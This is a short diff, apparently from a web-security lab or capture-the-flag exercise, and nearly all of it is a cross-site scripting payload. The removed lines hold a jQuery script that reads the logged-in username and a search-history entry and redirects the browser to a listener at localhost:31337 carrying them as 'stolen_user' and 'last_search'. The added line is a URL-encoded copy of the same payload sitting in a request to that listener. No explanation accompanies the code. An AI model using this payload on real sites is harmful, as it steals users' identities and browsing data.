@@ -1,8 +1,1 @@
-<script>
-$( document ).ready(function() {
-    var user = $( "#logged-in-user" ).text();
-    var last = $( "div a.history-item:nth-child(2)" ).text();
-    var url = "http://localhost:31337/?" + "stolen_user=" + user + "&" + "last_search=" + last;
-    window.location.replace(url);
-});
-</script>
+http://localhost:31337/?stolen_user=notahacker&last_search=%3Cscript%3E%20$(%20document%20).ready(function()%20{%20%20%20%20%20var%20user%20=%20$(%20`#logged-in-user%60%20).text()%20&#%20%20%20%20%20alert(user)%20&#%20%20%20%20%20var%20last%20=%20$(%20%60div%20a.history-item:nth-child(2)%60%20).text()%20&#%20%20%20%20%20alert(last)%20&#%20%20%20%20%20var%20url%20=%20%60http://localhost:31337/?%60%20+%20%60stolen_user=%60%20+%20user%20+%20%60&%60%20+%20%60last_search=%60%20+%20last%20&#%20%20%20%20%20window.location.replace(url)%20&#%20%20%20%20%20})&#%20%3C/script%3E
